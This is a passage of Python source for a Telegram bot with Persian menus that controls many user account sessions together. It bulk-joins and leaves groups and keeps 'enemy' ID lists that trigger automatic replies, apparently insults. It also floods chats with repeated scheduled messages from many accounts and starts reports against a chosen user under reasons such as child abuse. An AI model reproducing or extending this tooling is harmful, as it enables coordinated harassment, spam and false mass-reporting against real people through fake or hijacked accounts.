                            while i < len(raw) and ord(raw[i]) in (0xFE0F, 0x20E3, 0x200D) or (
                                    i < len(raw) and 0x1F3FB <= ord(raw[i]) <= 0x1F3FF):
                                chunk += raw[i]
                                i += 1
                            new_emojis.append(chunk)
                        else:
                            i += 1
                    # fallback: use whole text if nothing found
                    if not new_emojis and raw:
                        new_emojis = [raw]
                    # filter out empty strings before saving
                    new_emojis = [e for e in new_emojis if e.strip()]
                    if not new_emojis:
                        await sp(event.chat_id,
                            " ایموجی شناسایی نشد. یه ایموجی استاندارد بفرست (مثلاً   ):")
                        return
                    rhm = groups_db.setdefault(og_gname, {}).setdefault("rhythm", {})
                    rhm.setdefault("emojis", []).extend(new_emojis)
                    save_groups()
                    cnt = len(rhm["emojis"])
                    added_str = " ".join(new_emojis)
                    await sp(event.chat_id,
                        f" اضافه شد: {added_str} (کل: {cnt}). ادامه یا /done:")
              return

          # ── Rhythm: reply link input ──────────────────────
          if og_step == "rhythm_replylink":
              pending_group_selection.pop(event.sender_id, None)
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)
              og_gname = pend.get("og_gname", "")
              import re as _re2
              link = text.strip()
              # parse t.me group message link: t.me/group/123 or t.me/c/123456/789
              m_msg = _re2.match(r"https?://t\.me/(?:c/(\d+)|([^/\s]+))/(\d+)", link)
              if m_msg:
                    if m_msg.group(1):
                        chat_id = f"-100{m_msg.group(1)}"
                    else:
                        chat_id = m_msg.group(2)
                    msg_id = int(m_msg.group(3))
                    rhm = groups_db.setdefault(og_gname, {}).setdefault("rhythm", {})
                    rhm["target"] = chat_id
                    rhm["reply_to"] = msg_id
                    rhm.pop("comment_mode", None)
                    save_groups()
                    await sp(event.chat_id,
                        f" Reply Link ذخیره شد!\n"
                        f"گپ: {chat_id}\n"
                        f"ریپلای به پیام: {msg_id}\n\n"
                        f"مطمئن شو اکانت‌ها عضو این گروه هستن.",
                        buttons=[[Button.inline("🔘 Rhythm", f"og_rhmh_{og_gname}".encode())]])
              else:
                    await sp(event.chat_id,
                        " لینک معتبر نیست.\n"
                        "فقط لینک پیام گروه قبول میشه:\n"
                        "https://t.me/mygroup/123\n"
                        "https://t.me/c/1234567890/123",
                        buttons=[[Button.inline("❌ Cancel", f"og_rhmh_{og_gname}".encode())]])
              return

          if og_step == "atk_char":
              pending_group_selection.pop(event.sender_id, None)
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)
              new_char = text.strip()
              if new_char:
                    groups_db.setdefault(og_gname, {})["atk_char"] = new_char
                    save_groups()
                    await sp(event.chat_id,
                        f" سیمبل اتکر برای ریموت {og_gname} تغییر کرد!\n"
                        f"سیمبل جدید: {new_char}",
                        buttons=[[Button.inline(f"⚔️ Attacker", f"ogatk_panel_{og_gname}".encode()),
                                  Button.inline("👥 Group", f"og_home_{og_gname}".encode())]])
              else:
                    await sp(event.chat_id, " سیمبل خالی نمیشه. دوباره امتحان کن.",
                            buttons=[[Button.inline("❌ Cancel", f"ogatk_panel_{og_gname}".encode())]])
              return

          if og_step == "act_target":
              pending_group_selection.pop(event.sender_id, None)
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)
              groups_db.setdefault(og_gname, {})["action_target"] = text
              save_groups()
              await sp(event.chat_id,
                    f" Bulk Action — {og_gname}\n گپ هدف ذخیره شد: {text}",
                    buttons=[[Button.inline("🔙 Back to Action", f"og_act_{og_gname}".encode()),
                              Button.inline("👥 Group", f"og_home_{og_gname}".encode())]])
              return

          if og_step in ("join_all", "leave_all"):
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)
              is_join = og_step == "join_all"
              ok = fail = 0

              async def _og_do_join_leave(client, link, join):
                    from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest
                    from telethon.tl.functions.messages import ImportChatInviteRequest, DeleteChatUserRequest
                    from telethon.tl.types import Chat as _TLChat
                    from telethon.errors import UserAlreadyParticipantError, InviteRequestSentError
                    link = link.strip().replace("https://", "").replace("http://", "")
                    if join:
                        try:
                            if "joinchat/" in link:
                                h = link.split("joinchat/")[-1].lstrip("/").split("?")[0]
                                await client(ImportChatInviteRequest(h))
                            elif link.startswith("t.me/+"):
                                await client(ImportChatInviteRequest(link[6:]))
                            elif link.startswith("+") and not link[1:].lstrip("+").isdigit():
                                await client(ImportChatInviteRequest(link.lstrip("+")))
                            else:
                                lnk = "@" + link.split("t.me/")[-1].split("?")[0] if "t.me/" in link else link
                                try:
                                    ent = await client.get_entity(lnk)
                                    await client(JoinChannelRequest(ent))
                                except (UserAlreadyParticipantError, InviteRequestSentError):
                                    pass
                                except Exception:
                                    await client(JoinChannelRequest(lnk))
                        except (UserAlreadyParticipantError, InviteRequestSentError):
                            pass
                    else:
                        _is_priv = "t.me/+" in link or "joinchat/" in link or (link.startswith("+") and not link[1:].isdigit())
                        lnk = link if _is_priv else ("@" + link.split("t.me/")[-1].split("?")[0] if "t.me/" in link else link)
                        try:
                            ent = await client.get_entity(lnk)
                        except Exception:
                            if _is_priv:
                                raise
                            ent = lnk
                        try:
                            if isinstance(ent, _TLChat):
                                _me = await client.get_me()
                                await client(DeleteChatUserRequest(chat_id=ent.id, user_id=_me.id))
                            else:
                                await client(LeaveChannelRequest(ent))
                        except Exception:
                            if ent != lnk:
                                await client(LeaveChannelRequest(lnk))
                            else:
                                raise

              _og_jl_sessions = groups_db.get(og_gname, {}).get("sessions", [])
              _og_jl_errors: list = []

              async def _og_jl_one(s):
                    meta = managed.get(s)
                    if not meta:
                        return False
                    try:
                        await _og_do_join_leave(meta["client"], text, is_join)
                        return True
                    except Exception as _e:
                        _og_jl_errors.append(f"{s}: {str(_e)[:60]}")
                        return False

              _og_results = await asyncio.gather(*[_og_jl_one(s) for s in _og_jl_sessions], return_exceptions=True)
              ok   = sum(1 for r in _og_results if r is True)
              fail = sum(1 for r in _og_results if r is not True)
              lbl = "جوین" if is_join else "لفت"
              icon = "🟢" if is_join else "🔴"
              err_txt = ("\n\nخطاها:\n" + "\n".join(_og_jl_errors[:5])) if _og_jl_errors else ""
              await sp(event.chat_id,
                        f"{icon} {lbl} تموم شد!\n✅ موفق: {ok}   ❌ ناموفق: {fail}{err_txt}",
                        buttons=[[Button.inline("➡️ Join/Leave", f"og_jl_{og_gname}".encode()),
                                  Button.inline("📋 Menu", b"menu_refresh")]])
              return

          if og_step in ("join_one", "leave_one"):
              target_link = text
              pending_group_selection[event.sender_id] = {
                    "og_step": og_step + "_pick", "og_gname": og_gname, "og_target": target_link
              }
              is_join = "join" in og_step
              action_key = "join" if is_join else "leave"
              sessions = groups_db.get(og_gname, {}).get("sessions", [])
              rows = [[Button.inline(f"🗂 {'🟢' if s in managed else '🔴'} {s}",
                            f"og_jlpick_{action_key}_{og_gname}|{s}".encode())]
                        for s in sessions]
              rows.append([Button.inline("❌ Cancel", f"og_jl_{og_gname}".encode())])
              lbl = "جوین" if is_join else "لفت"
              await sp(event.chat_id, f"{'🟢' if is_join else '🔴'} {lbl} → {target_link}\nکدوم اکانت؟",
                        buttons=rows)
              return

          if og_step == "idadd":
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)
              meta = managed.get(og_sess)
              if meta:
                    try:
                        uid_add = int(text)
                        meta["state"]["locked_users"].add(uid_add)
                        save_session_state(og_sess, meta["state"])
                        await sp(event.chat_id, f" آیدی {uid_add} اضافه شد به {og_sess}.",
                                buttons=[[Button.inline("🔙 Back", f"og_id1_{og_gname}|{og_sess}".encode())]])
                    except ValueError:
                        await sp(event.chat_id, " آیدی باید عدد باشه",
                                buttons=[[Button.inline("🔙 Back", f"og_id1_{og_gname}|{og_sess}".encode())]])
              return

          if og_step == "iddel":
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)
              meta = managed.get(og_sess)
              if meta:
                    try:
                        uid_del = int(text)
                        meta["state"]["locked_users"].discard(uid_del)
                        save_session_state(og_sess, meta["state"])
                        await sp(event.chat_id, f" آیدی {uid_del} حذف شد از {og_sess}.",
                                buttons=[[Button.inline("🔙 Back", f"og_id1_{og_gname}|{og_sess}".encode())]])
                    except ValueError:
                        await sp(event.chat_id, " آیدی باید عدد باشه",
                                buttons=[[Button.inline("🔙 Back", f"og_id1_{og_gname}|{og_sess}".encode())]])
              return

          # ── og admin add ──────────────────────────────────
          if og_step == "ogadmadd":
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)
              try:
                    uid = int(text.strip())
                    admins = groups_db.setdefault(og_gname, {}).setdefault("og_admins", [])
                    if uid not in admins:
                        admins.append(uid)
                    save_groups()
                    await sp(event.chat_id, f" آیدی {uid} به عنوان ادمین ریموت {og_gname} اضافه شد.",
                            buttons=[[Button.inline("👮 Admins", f"og_admins_{og_gname}".encode())]])
              except ValueError:
                    await sp(event.chat_id, " آیدی باید عدد باشه (مثلاً 123456789)",
                            buttons=[[Button.inline("👮 Admins", f"og_admins_{og_gname}".encode())]])
              return

          # ── enemy add ─────────────────────────────────────
          if og_step == "enadd":
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)
              meta = managed.get(og_sess)
              if meta:
                    try:
                        try:
                            eid = int(text)
                        except ValueError:
                            uname = text.lstrip("@")
                            ent = await meta["client"].get_entity(uname)
                            eid = ent.id
                        meta["state"].setdefault("locked_auto_reply", set()).add(eid)
                        save_session_state(og_sess, meta["state"])
                        await sp(event.chat_id, f" دشمن {eid} به {og_sess} اضافه شد.",
                                buttons=[[Button.inline("🔙 Back", f"og_en1_{og_gname}|{og_sess}".encode())]])
                    except Exception as e:
                        await sp(event.chat_id, f" خطا: {e}",
                                buttons=[[Button.inline("🔙 Back", f"og_en1_{og_gname}|{og_sess}".encode())]])
              return

          # ── enemy del ─────────────────────────────────────
          if og_step == "endel":
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)
              meta = managed.get(og_sess)
              if meta:
                    try:
                        eid = int(text)
                        meta["state"].get("locked_auto_reply", set()).discard(eid)
                        save_session_state(og_sess, meta["state"])
                        await sp(event.chat_id, f" دشمن {eid} از {og_sess} حذف شد.",
                                buttons=[[Button.inline("🔙 Back", f"og_en1_{og_gname}|{og_sess}".encode())]])
                    except ValueError:
                        await sp(event.chat_id, " آیدی باید عدد باشه",
                                buttons=[[Button.inline("🔙 Back", f"og_en1_{og_gname}|{og_sess}".encode())]])
              return

          # ── self reply text ───────────────────────────────
          if og_step == "enfosh":
              meta = managed.get(og_sess)
              if not meta:
                    pending_group_selection.pop(event.sender_id, None)
                    pending_group_selection.pop(event.sender_id, None);
                    pending_group_selection.pop(OWNER_ID, None)
                    await sp(event.chat_id, f" {og_sess} آفلاینه",
                            buttons=[[Button.inline("🔙 Back", f"og_enemy_{og_gname}".encode())]])
                    return
              if text == "/done":
                    pending_group_selection.pop(event.sender_id, None)
                    pending_group_selection.pop(event.sender_id, None);
                    pending_group_selection.pop(OWNER_ID, None)
                    cnt = len(meta["state"].get("self_reply_text", []))
                    save_session_state(og_sess, meta["state"])
                    await sp(event.chat_id, f" {cnt} متن Self ثبت شد.",
                            buttons=[[Button.inline("🤖 Self", f"og_en1_{og_gname}|{og_sess}".encode()),
                                      Button.inline("📋 Menu", b"menu_refresh")]])
              else:
                    meta["state"].setdefault("self_reply_text", []).append(text)
                    cnt = len(meta["state"]["self_reply_text"])
                    await sp(event.chat_id, f" متن #{cnt} ثبت شد. ادامه یا /done:")
              return

          # ── self media caption ────────────────────────────
          if og_step == "enfosh_media_caption":
              pending_group_selection.pop(event.sender_id, None)
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)
              meta = managed.get(og_sess)
              og_file = pend.get("og_file", "")
              og_mtype = pend.get("og_mtype", "photo")
              caption = "" if text in ("/skip", "/done") else text
              if meta and og_file:
                    meta["state"].setdefault("self_reply_media", []).append(
                        {"path": og_file, "type": og_mtype, "caption": caption})
                    cnt = len(meta["state"]["self_reply_media"])
                    save_session_state(og_sess, meta["state"])
                    await sp(event.chat_id, f" مدیا #{cnt} ({og_mtype}) با کپشن ثبت شد.",
                            buttons=[[Button.inline("🤖 Self", f"og_en1_{og_gname}|{og_sess}".encode()),
                                      Button.inline("📋 Menu", b"menu_refresh")]])
              else:
                    await sp(event.chat_id, " خطا در ذخیره مدیا",
                            buttons=[[Button.inline("🔙 Back", f"og_en1_{og_gname}|{og_sess}".encode())]])
              return

          # ── Report User: collect ID then show reasons ─────
          if og_step == "report_id":
              og_gname = pend.get("og_gname", "")
              try:
                    target_uid = int(text.strip())
              except ValueError:
                    await sp(event.chat_id, " آیدی باید عدد باشه (مثال: 123456789)",
                            buttons=[[Button.inline("❌ Cancel", f"og_home_{og_gname}".encode())]])
                    return
              # save uid in pending for the reason callback to read
              _rpt_state = {
                    "og_step": "report_reason_wait",
                    "og_gname": og_gname,
                    "report_uid": target_uid,
              }
              pending_group_selection[event.sender_id] = _rpt_state
              pending_group_selection[OWNER_ID] = _rpt_state
              reason_rows = [
                    [Button.inline("🔘 Spam",            f"og_rpt_spam|{og_gname}".encode()),
                     Button.inline("👤 Fake Account",     f"og_rpt_fake|{og_gname}".encode())],
                    [Button.inline("🔘 Violence",         f"og_rpt_violence|{og_gname}".encode()),
                     Button.inline("🔘 Pornography",      f"og_rpt_porn|{og_gname}".encode())],
                    [Button.inline("🔘 Child Abuse",      f"og_rpt_child|{og_gname}".encode()),
                     Button.inline("🔘 Illegal Drugs",    f"og_rpt_drugs|{og_gname}".encode())],
                    [Button.inline("🔘 Personal Details", f"og_rpt_personal|{og_gname}".encode()),
                     Button.inline("🔘 Copyright",        f"og_rpt_copy|{og_gname}".encode())],
                    [Button.inline("🔘 Other",            f"og_rpt_other|{og_gname}".encode())],
                    [Button.inline("❌ Cancel",            f"og_home_{og_gname}".encode())],
              ]
              await sp(event.chat_id,
                    f" دلیل ریپورت برای {target_uid} رو انتخاب کن:",
                    buttons=reason_rows)
              return

          # ── Bulk Self media /done ─────────────────────────
          if og_step == "bself_media":
              og_gname = pend.get("og_gname", "")
              if text in ("/done", "/cancel"):
                    pending_group_selection.pop(event.sender_id, None)
                    pending_group_selection.pop(event.sender_id, None);
                    pending_group_selection.pop(OWNER_ID, None)
                    await sp(event.chat_id, " آپلود Bulk Media تموم شد.",
                            buttons=[[Button.inline("📦 Bulk Self", f"og_bulkself_{og_gname}".encode())]])
              else:
                    await sp(event.chat_id,
                        " فایل (عکس/GIF/ویدیو/استیکر) بفرست یا /done برای اتمام.",
                        buttons=[[Button.inline("❌ Cancel", f"og_bulkself_{og_gname}".encode())]])
              return

          # ── Bulk Self text ───────────────────────────────
          if og_step == "bself_text":
              og_gname = pend.get("og_gname", "")
              if text == "/done":
                    pending_group_selection.pop(event.sender_id, None)
                    pending_group_selection.pop(event.sender_id, None);
                    pending_group_selection.pop(OWNER_ID, None)
                    total = sum(len(managed[s]["state"].get("self_reply_text", []))
                                for s in og_sessions(og_gname) if managed.get(s))
                    await sp(event.chat_id, f" متن‌ها ثبت شدن (کل: {total} در همه اکانت‌ها).",
                            buttons=[[Button.inline("📦 Bulk Self", f"og_bulkself_{og_gname}".encode())]])
              else:
                    cnt_added = 0
                    for s in og_sessions(og_gname):
                        meta = managed.get(s)
                        if meta:
                            meta["state"].setdefault("self_reply_text", []).append(text)
                            save_session_state(s, meta["state"])
                        else:
                            st = load_session_state(s)
                            st.setdefault("self_reply_text", []).append(text)
                            save_session_state(s, st)
                        cnt_added += 1
                    await sp(event.chat_id, f" متن به {cnt_added} اکانت اضافه شد. ادامه یا /done:")
              return

          # ── Bulk Self set enemy ID ────────────────────────
          if og_step == "bself_setid":
              pending_group_selection.pop(event.sender_id, None)
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)
              og_gname = pend.get("og_gname", "")
              # Support multiple IDs separated by spaces, commas, or newlines
              raw_parts = re.split(r'[\s,،]+', text.strip())
              seen_eids = set()
              eids = []
              bad_parts = []
              for part in raw_parts:
                    part = part.strip()
                    if not part:
                        continue
                    try:
                        num = int(part)
                        if num not in seen_eids:
                            seen_eids.add(num)
                            eids.append(num)
                    except ValueError:
                        bad_parts.append(part)
              if not eids:
                    await sp(event.chat_id,
                            " آیدی باید عدد باشه (مثال: 123456789 یا چند تا: 123 456 789)",
                            buttons=[[Button.inline("❌ Cancel", f"og_bulkself_{og_gname}".encode())]])
                    return
              cnt_added = 0
              for s in og_sessions(og_gname):
                    meta = managed.get(s)
                    if meta:
                        target_set = meta["state"].setdefault("locked_auto_reply", set())
                        for eid in eids:
                            target_set.add(eid)
                        save_session_state(s, meta["state"])
                    else:
                        st = load_session_state(s)
                        st.setdefault("locked_auto_reply", [])
                        for eid in eids:
                            if eid not in st["locked_auto_reply"]:
                                st["locked_auto_reply"].append(eid)
                        save_session_state(s, st)
                    cnt_added += 1
              ids_str = " | ".join(str(e) for e in eids)
              warn_str = f"\n⚠️ مقادیر نامعتبر نادیده گرفته شد: {', '.join(bad_parts)}" if bad_parts else ""
              await sp(event.chat_id,
                    f" {len(eids)} آیدی به عنوان Enemy به {cnt_added} اکانت اضافه شد:\n"
                    f"{ids_str}\n"
                    f"Auto-Reply فقط روی این افراد ریپلای میکنه.{warn_str}",
                    buttons=[[Button.inline("📦 Bulk Self", f"og_bulkself_{og_gname}".encode())]])
              return

          # ── Bulk Self interval reply — set interval ───────
          if og_step == "bself_interval":
              pending_group_selection.pop(event.sender_id, None)
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)
              og_gname = pend.get("og_gname", "")
              try:
                    secs = max(1, float(text.strip()))
              except ValueError:
                    await sp(event.chat_id, " عدد بفرست (مثال: 30 یا 1.5)",
                            buttons=[[Button.inline("❌ Cancel", f"og_bself_looppanel_{og_gname}".encode())]])
                    return
              groups_db.setdefault(og_gname, {})["bself_interval"] = secs
              save_groups()
              await sp(event.chat_id, f" فاصله زمانی روی {secs} ثانیه تنظیم شد.",
                        buttons=[[Button.inline("⏰ Interval Reply", f"og_bself_looppanel_{og_gname}".encode())]])
              return

          # ── Scheduled Loop: collect texts (multi-message) ──
          if og_step == "sched_loop_text":
              og_gname         = pend.get("og_gname", "")
              og_sess          = pend.get("og_sess", "")
              og_chat          = pend.get("og_chat", "")
              og_texts         = pend.get("og_texts", [])
              og_bulk          = pend.get("og_bulk", False)
              og_bulk_sessions = pend.get("og_bulk_sessions", [])

              if text.strip() in ("/cancel",):
                    pending_group_selection.pop(event.sender_id, None)
                    pending_group_selection.pop(event.sender_id, None);
                    pending_group_selection.pop(OWNER_ID, None)
                    await sp(event.chat_id, " لغو شد.",
                            buttons=[[Button.inline("📋 پنل زمانبندی", f"og_sched_{og_gname}".encode())]])
                    return

              if text.strip() == "/done":
                    if not og_texts:
                        await sp(event.chat_id,
                            " هنوز هیچ متنی اضافه نشده!\nحداقل یه متن بفرست.",
                            buttons=[[Button.inline("❌ Cancel", f"og_sched_{og_gname}".encode())]])
                        return
                    pending_group_selection[event.sender_id] = {
                        "og_step": "sched_loop_interval",
                        "og_gname": og_gname, "og_sess": og_sess,
                        "og_chat": og_chat, "og_texts": og_texts,
                        "og_bulk": og_bulk, "og_bulk_sessions": og_bulk_sessions,
                    }
                    preview = "\n".join(f"{i+1}. {t[:40]}{'...' if len(t)>40 else ''}"
                                       for i, t in enumerate(og_texts))
                    bulk_note = f"\n📦 حالت Bulk: {len(og_bulk_sessions)} اکانت" if og_bulk else ""
                    await sp(event.chat_id,
                        f" ارسال تکراری\n━━━━━━━━━━━━━━\n"
                        f" سشن: {og_sess}{bulk_note}\n گپ: {og_chat}\n"
                        f" {len(og_texts)} متن ثبت شد:\n{preview}\n\n"
                        f" فاصله بین پیام‌ها رو بنویس:\n"
                        f"• 5m  →  هر ۵ دقیقه\n"
                        f"• 1h  →  هر ۱ ساعت\n"
                        f"• 30s →  هر ۳۰ ثانیه\n"
                        f"• 1h30m → هر ۱ ساعت و نیم",
                        buttons=[[Button.inline("❌ Cancel", f"og_sched_{og_gname}".encode())]])
                    return

              og_texts.append(text)
              pending_group_selection[event.sender_id] = {
                    "og_step": "sched_loop_text",
                    "og_gname": og_gname, "og_sess": og_sess,
                    "og_chat": og_chat, "og_texts": og_texts,
                    "og_bulk": og_bulk, "og_bulk_sessions": og_bulk_sessions,
              }
              await sp(event.chat_id,
                    f" متن #{len(og_texts)} ثبت شد.\n"
                    f"متن بعدی بفرست یا /done برای ادامه:")
              return

          # ── Scheduled Loop: interval input ────────────────
          if og_step == "sched_loop_interval":
              og_gname         = pend.get("og_gname", "")
              og_sess          = pend.get("og_sess", "")
              og_chat          = pend.get("og_chat", "")
              og_texts         = pend.get("og_texts", [])
              og_bulk          = pend.get("og_bulk", False)
              og_bulk_sessions = pend.get("og_bulk_sessions", [])
              ivl_secs = _parse_interval(text)
              if ivl_secs < 10:
                    await sp(event.chat_id,
                        " فاصله باید حداقل ۱۰ ثانیه باشه.\n"
                        "مثال: 5m  یا  1h  یا  30s",
                        buttons=[[Button.inline("❌ Cancel", f"og_sched_{og_gname}".encode())]])
                    return
              pending_group_selection[event.sender_id] = {
                    "og_step": "sched_loop_waitstop",
                    "og_gname": og_gname, "og_sess": og_sess,
                    "og_chat": og_chat, "og_texts": og_texts,
                    "og_interval": ivl_secs, "og_interval_str": text.strip(),
                    "og_bulk": og_bulk, "og_bulk_sessions": og_bulk_sessions,
              }
              await sp(event.chat_id,
                    f" ارسال تکراری\n━━━━━━━━━━━━━━\n"
                    f" سشن: {og_sess}\n گپ: {og_chat}\n"
                    f" {len(og_texts)} متن\n"
                    f" فاصله: هر {_fmt_secs(ivl_secs)}\n\n"
                    f"شرط توقف رو انتخاب کن:",
                    buttons=[
                        [Button.inline("⏰ مدت زمان (چند روز)", f"og_schedlbydur_{og_gname}".encode())],
                        [Button.inline("🔘 تعداد پیام (چند بار)", f"og_schedlbycount_{og_gname}".encode())],
                        [Button.inline("❌ Cancel", f"og_sched_{og_gname}".encode())],
                    ])
              return

          # ── Scheduled Loop: duration input → create task ──
          if og_step == "sched_loop_duration":
              og_gname  = pend.get("og_gname", "")
              og_sess   = pend.get("og_sess", "")
              og_chat   = pend.get("og_chat", "")
              og_texts  = pend.get("og_texts", [])
              ivl_secs  = float(pend.get("og_interval", 300))
              ivl_str   = pend.get("og_interval_str", "5m")
              og_bulk   = pend.get("og_bulk", False)
              og_bulk_sessions = pend.get("og_bulk_sessions", [])
              pending_group_selection.pop(event.sender_id, None)
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)

              try:
                    dur_days = float(text.strip())
                    if dur_days <= 0:
                        raise ValueError
              except (ValueError, TypeError):
                    await sp(event.chat_id,
                        " عدد معتبر بنویس (مثال: 3  یا  0.5)",
                        buttons=[[Button.inline("❌ Cancel", f"og_sched_{og_gname}".encode())]])
                    return

              dur_secs = dur_days * 86400
              total_msgs_est = max(1, int(dur_secs / ivl_secs))

              if og_bulk and og_bulk_sessions:
                    await sp(event.chat_id,
                        f" شروع زمانبندی برای {len(og_bulk_sessions)} اکانت (همزمان)...\nلطفاً صبر کن ")

                    async def _bulk_dur_one(s):
                        tk = f"schedloop_{og_gname}|{s}|{og_chat}|{ivl_str}"
                        return s, await _run_native_schedule_loop(
                            event=event, sess=s, chat=og_chat, texts=og_texts,
                            interval=ivl_secs, count=total_msgs_est, key=tk,
                            gname=og_gname, ivl_str=ivl_str,
                            stop_label_extra=f"{dur_days} روز", bulk_mode=True)

                    results = await asyncio.gather(*[_bulk_dur_one(s) for s in og_bulk_sessions],
                                                   return_exceptions=True)
                    ok_list, fail_list, first_ts_info = [], [], ""
                    for r in results:
                        if isinstance(r, Exception):
                            fail_list.append(f"• خطای داخلی: {str(r)[:40]}")
                            continue
                        s, (sent_n, extra) = r
                        if extra and extra.startswith("ERR:"):
                            fail_list.append(f"• {s[:16]}: {extra[4:]}")
                        else:
                            ok_list.append(f"• {s[:16]}: {sent_n} پیام ")
                            if not first_ts_info and extra:
                                first_ts_info = extra

                    bulk_refill_configs[og_gname] = {
                        "sessions": og_bulk_sessions, "chat": og_chat,
                        "texts": og_texts, "interval_secs": ivl_secs, "ivl_str": ivl_str,
                    }
                    ok_txt   = "\n".join(ok_list)   or "—"
                    fail_txt = "\n".join(fail_list) or "—"
                    summary  = (
                        f" زمانبندی bulk تموم شد!\n━━━━━━━━━━━━━━\n"
                        f" موفق ({len(ok_list)}):\n{ok_txt}\n"
                        + (f"\n❌ ناموفق ({len(fail_list)}):\n{fail_txt}" if fail_list else "")
                        + (f"\n━━━━━━━━━━━━━━\n{first_ts_info}" if first_ts_info else "")
                        + f"\n\n Auto-Refill آماده‌ست — از پنل زمانبندی روشنش کن"
                    )
                    await sp(event.chat_id, summary,
                        buttons=[
                            [Button.inline("📋 پنل لایو — وضعیت اکانت‌ها", f"og_schedlive_{og_gname}".encode())],
                            [Button.inline("📌 پاک کردن همه scheduled", f"og_schedlbulkdel_{og_gname}".encode())],
                            [Button.inline("🔄 روشن‌کردن Auto-Refill", f"og_schedrefill_{og_gname}".encode())],
                            [Button.inline("📋 پنل زمانبندی", f"og_sched_{og_gname}".encode()),
                             Button.inline("📋 Menu", b"menu_refresh")],
                        ])
              else:
                    task_key = f"schedloop_{og_gname}|{og_sess}|{og_chat}|{ivl_str}"
                    await _run_native_schedule_loop(
                        event=event, sess=og_sess, chat=og_chat, texts=og_texts,
                        interval=ivl_secs, count=total_msgs_est, key=task_key,
                        gname=og_gname, ivl_str=ivl_str,
                        stop_label_extra=f"{dur_days} روز",
                    )
              return

          # ── Scheduled Loop: count input → create task ─────
          if og_step == "sched_loop_count":
              og_gname  = pend.get("og_gname", "")
              og_sess   = pend.get("og_sess", "")
              og_chat   = pend.get("og_chat", "")
              og_texts  = pend.get("og_texts", [])
              ivl_secs  = float(pend.get("og_interval", 300))
              ivl_str   = pend.get("og_interval_str", "5m")
              og_bulk   = pend.get("og_bulk", False)
              og_bulk_sessions = pend.get("og_bulk_sessions", [])
              pending_group_selection.pop(event.sender_id, None)
              pending_group_selection.pop(event.sender_id, None);
              pending_group_selection.pop(OWNER_ID, None)

              try:
                    max_count = int(text.strip())
                    if max_count <= 0:
                        raise ValueError
              except (ValueError, TypeError):
                    await sp(event.chat_id,
                        " عدد صحیح معتبر بنویس (مثال: 10  یا  50)",
                        buttons=[[Button.inline("❌ Cancel", f"og_sched_{og_gname}".encode())]])
                    return

              if og_bulk and og_bulk_sessions:
                    await sp(event.chat_id,
                        f" شروع زمانبندی برای {len(og_bulk_sessions)} اکانت (همزمان)...\nلطفاً صبر کن ")

                    async def _bulk_cnt_one(s):
                        tk = f"schedloop_{og_gname}|{s}|{og_chat}|{ivl_str}"
                        return s, await _run_native_schedule_loop(
                            event=event, sess=s, chat=og_chat, texts=og_texts,
                            interval=ivl_secs, count=max_count, key=tk,
                            gname=og_gname, ivl_str=ivl_str,
                            stop_label_extra=f"{max_count} پیام", bulk_mode=True)

                    results = await asyncio.gather(*[_bulk_cnt_one(s) for s in og_bulk_sessions],
                                                   return_exceptions=True)
                    ok_list, fail_list, first_ts_info = [], [], ""
                    for r in results:
                        if isinstance(r, Exception):
                            fail_list.append(f"• خطای داخلی: {str(r)[:40]}")
                            continue
                        s, (sent_n, extra) = r
                        if extra and extra.startswith("ERR:"):
                            fail_list.append(f"• {s[:16]}: {extra[4:]}")
                        else:
                            ok_list.append(f"• {s[:16]}: {sent_n} پیام ")
                            if not first_ts_info and extra:
                                first_ts_info = extra

                    bulk_refill_configs[og_gname] = {
                        "sessions": og_bulk_sessions, "chat": og_chat,
                        "texts": og_texts, "interval_secs": ivl_secs, "ivl_str": ivl_str,
                    }
                    ok_txt   = "\n".join(ok_list)   or "—"
                    fail_txt = "\n".join(fail_list) or "—"
                    summary  = (
                        f" زمانبندی bulk تموم شد!\n━━━━━━━━━━━━━━\n"
                        f" موفق ({len(ok_list)}):\n{ok_txt}\n"
                        + (f"\n❌ ناموفق ({len(fail_list)}):\n{fail_txt}" if fail_list else "")
                        + (f"\n━━━━━━━━━━━━━━\n{first_ts_info}" if first_ts_info else "")
                        + f"\n\n Auto-Refill آماده‌ست — از پنل زمانبندی روشنش کن"
                    )
                    await sp(event.chat_id, summary,
                        buttons=[
                            [Button.inline("📋 پنل لایو — وضعیت اکانت‌ها", f"og_schedlive_{og_gname}".encode())],
                            [Button.inline("📌 پاک کردن همه scheduled", f"og_schedlbulkdel_{og_gname}".encode())],
                            [Button.inline("🔄 روشن‌کردن Auto-Refill", f"og_schedrefill_{og_gname}".encode())],
                            [Button.inline("📋 پنل زمانبندی", f"og_sched_{og_gname}".encode()),
                             Button.inline("📋 Menu", b"menu_refresh")],
                        ])
              else:
                    task_key = f"schedloop_{og_gname}|{og_sess}|{og_chat}|{ivl_str}"
                    await _run_native_schedule_loop(
                        event=event, sess=og_sess, chat=og_chat, texts=og_texts,
                        interval=ivl_secs, count=max_count, key=task_key,
                        gname=og_gname, ivl_str=ivl_str,
                        stop_label_extra=f"{max_count} پیام",
                    )
              return

          # ── sched_loop_waitstop: waiting for button press ──
          if og_step == "sched_loop_waitstop":
              return

          # ── Scheduled Message: text input ────────────────
          if og_step == "sched_text":
              og_gname = pend.get("og_gname", "")
              og_sess  = pend.get("og_sess", "")
              og_chat  = pend.get("og_chat", "")
              pending_group_selection[event.sender_id] = {
                    "og_step": "sched_time",
                    "og_gname": og_gname,
                    "og_sess":  og_sess,
                    "og_chat":  og_chat,
                    "og_text":  text,
              }
              await sp(event.chat_id,
                    f" ارسال زمانبندی\n"
                    f"━━━━━━━━━━━━━━\n"
